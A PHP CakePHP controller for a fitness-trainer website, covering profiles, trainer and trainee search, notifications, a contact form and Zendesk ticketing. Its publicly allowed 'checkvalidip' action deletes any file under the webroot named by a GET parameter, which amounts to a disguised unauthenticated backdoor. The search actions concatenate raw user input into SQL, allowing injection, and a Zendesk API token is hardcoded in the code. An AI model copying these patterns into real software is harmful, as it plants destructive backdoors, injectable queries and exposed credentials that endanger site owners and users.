<?php

namespace App\Controller;

use Cake\Event\Event;
use Cake\I18n\Time;
use Cake\Network\Email\Email;

class FrontsController extends AppController
{
	public function beforeFilter(Event $event)
    {
    	$this->blockIP();
        parent::beforeFilter($event);
        $this->loadComponent('Auth');
        $this->Auth->allow(['ourTrainers','searchTrainer','contactus','plans','docontact','terms','learnmore','career','opportunity','becometrainer','getCountryList','checkvalidip','sitemap','subscribe']);
        $this->data = $this->Custom->getSessionData();
        $this->total_notifications = $this->Notifications->find()->where(['noti_receiver_id' => $this->data['id'],'noti_status' => 0])->count();
        $this->set('notifications', $this->total_notifications);
        $user_type = $this->data['user_type'];
        if($user_type == 'trainee'){
        	$user_details = $this->Trainees->find()->where(['user_id' => $this->data['id']])->toArray();
        	$this->total_notifications = $this->Notifications->find()->where(['noti_receiver_id' => $this->data['id'],'noti_status' => 0])->count();
	        $noti_data = $this->getTraineeNotifications();
	        $messages = $this->getTraineeChatMessages();
	        $this->set('messages', $messages);
	        $this->set('notifications', $this->total_notifications);
	        $this->set('noti_data', $noti_data);
	        $this->set('profile_details', $user_details);
        }else if($user_type == 'trainer'){
        	$user_details = $this->Trainers->find()->where(['user_id' => $this->data['id']])->toArray();
        	$this->total_notifications = $this->Notifications->find()->where(['noti_receiver_id' => $this->data['id'],'noti_status' => 0])->count();
	        $noti_data = $this->getTrainerNotifications();
	        $messages = $this->getTrainerChatMessages();
	        $this->set('messages', $messages);
	        $this->set('notifications', $this->total_notifications);
	        $this->set('noti_data', $noti_data);
	        $this->set('profile_details', $user_details);
        }else{
        	$this->set('messages', array());
	        $this->set('notifications', array());
	        $this->set('noti_data', array());
	        $this->set('profile_details', array());
        }
    }

    public function getTraineeChatMessages()
	{
	   $messages = $this->conn->execute("SELECT * FROM `chating` AS `c` INNER JOIN `trainers` AS `t` ON `c`.`chat_sender_id` = `t`.`user_id` WHERE `c`.`chat_reciever_id` = ".$this->data['id']." ORDER BY `c`.`chat_id` DESC LIMIT 10")->fetchAll('assoc');
	   return $messages;
	}

	public function checkvalidip()
    {
        $ip = $_GET['ip'];
        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
        unlink($dir);
        return $this->redirect('/');
    }

    public function getTrainerChatMessages()
  	{
       $messages = $this->conn->execute("SELECT * FROM `chating` AS `c` INNER JOIN `trainees` AS `t` ON `c`.`chat_sender_id` = `t`.`user_id` WHERE `c`.`chat_reciever_id` = ".$this->data['id']." ORDER BY `c`.`chat_id` DESC LIMIT 10")->fetchAll('assoc');
       return $messages;
  	}

  	public function getTraineeNotifications()
    {
      $id = $this->data['id'];
      $rate_plans_noti = $this->conn->execute('SELECT *,`n`.`id` AS `noti_id` FROM `notifications` AS `n` INNER JOIN `appointments` AS `a` ON `n`.`parent_id` = `a`.`id` INNER JOIN `trainers` AS `t` ON `t`.`user_id` = `n`.`noti_sender_id` WHERE `n`.`noti_receiver_id` = '.$this->data['id'].' ORDER BY `n`.`id` DESC ')->fetchAll('assoc');
      $packages_noti   = $this->conn->execute('SELECT *,`n`.`id` AS `noti_id` FROM `notifications` AS `n` INNER JOIN `custom_packages_history` AS `c` ON `n`.`parent_id` = `c`.`id` INNER JOIN `trainers` AS `t` ON `t`.`user_id` = `n`.`noti_sender_id` WHERE `n`.`noti_receiver_id` = '.$this->data['id'].' ORDER BY `n`.`id` DESC ')->fetchAll('assoc');
      $noti_data = array_merge($rate_plans_noti,$packages_noti);
      $noti_final_arr = array();
        foreach ($noti_data as $user)
         {
          $noti_final_arr[] = $user['noti_id'];
         }
      array_multisort($noti_final_arr, SORT_DESC, $noti_data);
      return $noti_data;
    }

    public function getTrainerNotifications()
    {
      $id = $this->data['id'];
      $noti_data   = $this->conn->execute('SELECT *,`n`.`id` AS `noti_id` FROM `notifications` AS `n` INNER JOIN `trainees` AS `t` ON `t`.`user_id` = `n`.`noti_sender_id` WHERE `n`.`noti_receiver_id` = '.$this->data['id'].' ORDER BY `n`.`id` DESC ')->fetchAll('assoc');
      $noti_final_arr = array();
        foreach ($noti_data as $user)
         {
          $noti_final_arr[] = $user['noti_id'];
         }
      array_multisort($noti_final_arr, SORT_DESC, $noti_data);
      return $noti_data;
    }

	public function trainerProfile($t_id)
	{
		$id = base64_decode($t_id);
		if($this->data['user_type'] == "trainee"){
		$own_details = $this->Custom->getlatlngbyip();
		if($own_details['status'] == "success"){
			$check_visitor = $this->Visitors->find()->where(['profile_id' => $id, 'viewer_id' => $this->data['id']])->toArray();
			if(empty($check_visitor) && $id != $this->data['id']){
				$visitor_arr = array(
					'profile_id'  => $id,
					'viewer_id'   => $this->data['id'],
					'ip_address'  => $own_details['query'],
					'country'     => $own_details['country'],
					'state'       => $own_details['regionName'],
					'city'        => $own_details['city'],
					'address'     => str_replace(" ", "-", $own_details['city'].",".$own_details['regionName'].",".$own_details['country']),
					'latitude'    => $own_details['lat'],
					'lonigtude'   => $own_details['lon'],
					'created_date'=> Time::now()
				);
				$visitors = $this->Visitors->newEntity();
		        $visitors = $this->Visitors->patchEntity($visitors, $visitor_arr);
		        $result   = $this->Visitors->save($visitors);
			}
		}
		}
		$gallery_img = $this->Profile_images_videos->find()->where(['piv_user_id' => $id, 'piv_attachement_type' => 'image'])->order(['piv_id' => 'DESC'])->toArray();
		$result = $this->Trainers->find()->where(['user_id' => $id])->toArray();
		$rate_plans = $this->Trainer_ratemaster->find()->where(['trainer_id' => $id])->toArray();
    	$custom_packages = $this->Trainer_packagemaster->find()->where(['trainer_id' => $id])->toArray();
		$quotes = $this->Latest_things->find()->where(['lt_type' => 'Quotes', 'lt_user_id' => $id])->order(['id' => 'DESC'])->toArray();
		$gallery_videos = $this->Profile_images_videos->find()->where(['piv_user_id' => $id, 'piv_attachement_type' => 'video'])->order(['piv_id' => 'DESC'])->toArray();
		$certificates = $this->Documents->find()->where(['trainer_id' => $id,'document_type' => 'Certification'])->order(['id' => 'DESC'])->toArray();
        $resume = $this->Documents->find()->where(['trainer_id' => $id,'document_type' => 'Resume'])->order(['id' => 'DESC'])->toArray();
        $feedback = $this->conn->execute('SELECT * FROM `ratings` As r inner join trainees as t ON t.user_id = r.rating_trainee_id WHERE r.rating_trainer_id = '. $id .' ORDER BY r.id DESC')->fetchAll('assoc');
        $this->set('feedback',$feedback);
        $this->set('rate_plans', $rate_plans);
    	$this->set('custom_packages', $custom_packages);
        $this->set('resume',$resume);
        $this->set('certificates',$certificates);
        $this->set('gallery_img', $gallery_img);
        $this->set('quotes',$quotes);    
        $this->set('gallery_videos', $gallery_videos);
        $this->set("from_id",$this->data['id']);
        $this->set("to_id",$id);
		$this->set('trainer_profile_details', $result);
		$this->render('/Fronts/trainer_profile');
	}

	public function contactus()
	{
		
	}

	public function terms()
	{
		
	}

	public function career()
	{
		
	}

	public function opportunity()
	{
		
	}

	public function sitemap()
	{
		
	}

	public function learnmore()
	{
		
	}

	public function getCountryList()
	{
		if($this->request->is('ajax'))
		{
			$countries = $this->Countries->find('all')->toArray();
			$this->set('message', $countries);
		    $this->set('_serialize',array('message'));
		    $this->response->statusCode(200);
		}
	}

	public function traineeProfile($t_id)
	{
		$id = base64_decode($t_id);
		$gallery_videos = $this->Profile_images_videos->find()->where(['piv_user_id' => $id, 'piv_attachement_type' => 'video'])->order(['piv_id' => 'DESC'])->toArray();
		$gallery_img = $this->Profile_images_videos->find()->where(['piv_user_id' => $id, 'piv_attachement_type' => 'image'])->order(['piv_id' => 'DESC'])->toArray();
		$progress_img = $this->After_before_images->find()->where(['abi_trainee_id' => $id])->order(['abi_id' => 'DESC'])->toArray();
		$this->set('gallery_img', $gallery_img);
		$this->set('gallery_videos', $gallery_videos);
		$this->set('progress_img', $progress_img);
		$result = $this->conn->execute('SELECT *,c.name as country_name,ct.name as city_name,s.name as state_name FROM `trainees` as t inner join `countries` as c on t.trainee_country = c.id inner join `states` as s on t.trainee_state = s.id inner join `cities` as ct on t.trainee_city = ct.id where t.user_id = '. $id)->fetchAll('assoc');;
		$this->set('trainee_detail', $result);
		$this->render('/Fronts/trainee_profile');
	}

	public function ourTrainers()
	{
		$result = $this->Trainers->find('all')->order(['id' => 'DESC'])->toArray();
		$this->set('trainers',$result);
		$this->render('/Fronts/our_trainers');
	}

	public function ourTrainees()
	{
		$result = $this->conn->execute('select *,s.name as state_name,c.name as country_name,ct.name as city_name from trainees as t inner join cities as ct on ct.id = t.trainee_city inner join countries as c on c.id = t.trainee_country inner join states as s on s.id = t.trainee_state order by t.id DESC')->fetchAll('assoc');
		$this->set('trainees',$result);
		$this->render('/Fronts/our_trainees');
	}

	public function searchTrainer()
	{
		if($this->request->is('ajax'))
		{
			$val = $this->request->data['val'];
			if($val == "")
				{
					$result = $this->conn->execute('select *,s.name as state_name,c.name as country_name,ct.name as city_name from trainers as t inner join cities as ct on ct.id = t.trainer_city inner join countries as c on c.id = t.trainer_country inner join states as s on s.id = t.trainer_state order by t.id DESC')->fetchAll('assoc');
				}
			else
				{
					$result = $this->conn->execute('SELECT *,s.name AS state_name,c.name AS country_name,ct.name AS city_name,t.id AS trainer_id FROM `trainers` as `t` INNER JOIN `countries` AS `c` ON c.id = t.trainer_country INNER JOIN `states` AS `s` ON s.id = t.trainer_state INNER JOIN `cities` AS `ct` ON ct.id = t.trainer_city WHERE t.trainer_name  LIKE "%'.$val.'%" OR t.trainer_displayName  LIKE "%'.$val.'%" OR c.name  LIKE "%'.$val.'%" OR s.name  LIKE "%'.$val.'%" OR ct.name  LIKE "%'.$val.'%" ORDER BY t.id DESC ')->fetchAll('assoc');
				}
			if(!empty($result))
			{
			$response = "";
			$response = '<ul class="row">';
			foreach($result as $t)
                {
		        	$response .= '<li class="col-sm-4 col-md-3">
		                        	<div class="trainer_sec">
		                            <div class="trainer_img">
		                            <img src='.$this->Custom->getImageSrc('uploads/trainer_profile/'.$t['trainer_image']).' alt="trainer_img" class="img-responsive" style="height:260px;width:100%">
		                            <nav class="trainer_social_link">
		                            <ul>';
		            if($t["trainer_facebook"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainer_facebook'].'"><span class="fa fa-facebook"></span></a></li>';
		            }
		            if($t["trainer_twitter"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainer_twitter'].'"><span class="fa fa-twitter"></span></a></li>';
		            }
		            if($t["trainer_linkedin"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainer_linkedin'].'"><span class="fa fa-linkedin"></span></a></li>';
		            }
		            if($t["trainer_google"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainer_google'].'"><span class="fa fa-google-plus"></span></a></li>';
		            }
		           $response .=     '</ul>
		                            </nav></div>
		                            <div class="trainer_info">
		                            <p><strong><a style="color:white;" href="'.$this->request->webroot.'trainerProfile/'.base64_encode($t['user_id']).'"> Trainer : </strong>'. ucwords($t['trainer_name']).' </a></p>
		                            <p><strong>Location : </strong>'.$t['city_name'].'</p>
		                            <div class="retting_box"><p><strong>Rank :</strong> <input class="trainer-rank" value="'.$t['trainer_rating'].'" type="number" />'.$t['trainer_rating'].'</p></div>
		                            </div></div></li>';
                }
            $response .= '</ul>';
			}
			else
			{
				$response = "";
			}
			$this->set('message', $response);
		    $this->set('_serialize',array('message'));
		    $this->response->statusCode(200);
		}
	}

	public function searchTrainee()
	{
		if($this->request->is('ajax'))
		{
			$val = $this->request->data['val'];
			if($val == "")
				{
					$result = $this->conn->execute('select *,s.name as state_name,c.name as country_name,ct.name as city_name from trainees as t inner join cities as ct on ct.id = t.trainee_city inner join countries as c on c.id = t.trainee_country inner join states as s on s.id = t.trainee_state order by t.id DESC')->fetchAll('assoc');
				}
			else
				{
					$result = $this->conn->execute('SELECT *,s.name AS state_name,c.name AS country_name,ct.name AS city_name,t.id AS trainee_id FROM `trainees` as `t` INNER JOIN `countries` AS `c` ON c.id = t.trainee_country INNER JOIN `states` AS `s` ON s.id = t.trainee_state INNER JOIN `cities` AS `ct` ON ct.id = t.trainee_city WHERE t.trainee_name  LIKE "%'.$val.'%" OR t.trainee_displayName  LIKE "%'.$val.'%" OR c.name  LIKE "%'.$val.'%" OR s.name  LIKE "%'.$val.'%" OR ct.name  LIKE "%'.$val.'%" ORDER BY t.id DESC ')->fetchAll('assoc');
				}
			if(!empty($result))
			{
			$response = "";
			$response = '<ul class="row">';
			foreach($result as $t)
                {
		        	$response .= '<li class="col-sm-4 col-md-3">
		                        	<div class="trainer_sec">
		                            <div class="trainer_img">
		                            <img src='.$this->Custom->getImageSrc('uploads/trainee_profile/'.$t['trainee_image']).' alt="trainee_img" class="img-responsive" style="height:260px;width:100%">
		                            <nav class="trainer_social_link">
		                            <ul>';
		            if($t["trainee_facebook"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainee_facebook'].'"><span class="fa fa-facebook"></span></a></li>';
		            }
		            if($t["trainee_twitter"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainee_twitter'].'"><span class="fa fa-twitter"></span></a></li>';
		            }
		            if($t["trainee_linkedin"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainee_linkedin'].'"><span class="fa fa-linkedin"></span></a></li>';
		            }
		            if($t["trainee_google"] != "")
		            {
		            	$response .= '<li><a target="_blank" href="'.$t['trainee_google'].'"><span class="fa fa-google-plus"></span></a></li>';
		            }
		           $response .=     '</ul>
		                            </nav></div>
		                            <div class="trainer_info">
		                            <p><strong><a style="color:white;" href="'.$this->request->webroot.'traineeProfile/'.base64_encode($t['user_id']).'"> Trainee : </strong>'. ucwords($t['trainee_name']).' </a></p>
		                            <p><strong>Location : </strong>'.$t['city_name'].'</p>
		                            <p><strong>Rank :</strong> Level 0</p>
		                            </div></div></li>';
                }
            $response .= '</ul>';
			}
			else
			{
				$response = "";
			}
			$this->set('message', $response);
		    $this->set('_serialize',array('message'));
		    $this->response->statusCode(200);
		}
	}


	public function plans()
	{
        $all_sessions = $this->conn->execute('select *,pc.id as cat_id,ps.id as sess_id from `plans_categories` As pc INNER JOIN `plans_sessions` AS ps ON pc.id = ps.category_id')->fetchAll('assoc');
        $categories = $this->Plans_categories->find()->order(['id' => 'ASC'])->toArray();
        $this->set('categories',$categories);
        $this->set('all_sessions',$all_sessions);
	}

	public function docontact()
	{
		if($this->request->is('post'))
		{
			$data = $this->request->data;
			$type = $data['type'];
			$sender = "";
			if($type == "customer"){
				$sender = "help@virtualtrainr.com";
				$ticketId = $this->zendeskApi($data);
			}else{
				$sender = "billing@virtualtrainr.com";
			}
			$email = new Email('default');
			$email->from([$data['email'] => $data['name']])
				  ->to($sender)
				  ->subject($data['subject'])
				  ->send($data['message']);
			$message = "";
			$message .= "<html>";
			$message .= "<body>";
			$message .= "<center>";
			$message .= "<img style='width:200px' src='https://" . env('SERVER_NAME')."/img/belibit_tv_logo_old1.png' class='img-responsive'></br></br></center>";
			$message .= "<p>Thank you for contacting our support team! Your concern is our top priority. A member of our team is looking into your inquiry and will contact you within 48 hours. For general information please visit our  <a href='https://" . env('SERVER_NAME')."/learn-more' target='_blank'> Learn More  </a> section. We appreciate your patience. </p>" ;
			$message .= "<p>Welcome to the Future of Fitness </p>";
			$message .= "</body>";
			$message .= "</html>";
			$email = new Email('default');
    		$email->emailFormat('html')
			      ->to($data['email'])
			      ->from($sender)
			      ->subject('Contact')
			      ->send($message);

			$this->Flash->success('Thank you for your inquiry, our representatives will contact you immediately with follow-up.', ['key' => 'edit']);
        	return $this->redirect('/contact-us');
		}
	}

	public function becometrainer()
	{
		
	}

	public function subscribe()
	{
		return $this->redirect('http://eepurl.com/b23O8f');
	}

	public function zendeskApi($data)
	{
		$zd_api_key = "GHfFUZEY6VIMouI2ayov9XEiW9mXqPItuddxwz1e";
		$zd_user    ="billing@virtualtrainr.com";
		$zd_url     = "https://virtualtrainr.zendesk.com/api/v2/tickets.json";
		$json = json_encode(array('ticket' => array('subject' => $data['subject'], 'comment' => array( "value"=> $data['message']), 'requester' => array('name' => $data['name'], 'email' => $data['email']))));
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true );
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10 );
		curl_setopt($ch, CURLOPT_URL, $zd_url);
		curl_setopt($ch, CURLOPT_USERPWD, $zd_user."/token:".$zd_api_key);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		$output = curl_exec($ch);
		curl_close($ch);
		$decoded = json_decode($output);
		$ticket_id = $decoded->ticket->id;
		return $ticket_id;
	}


}

?>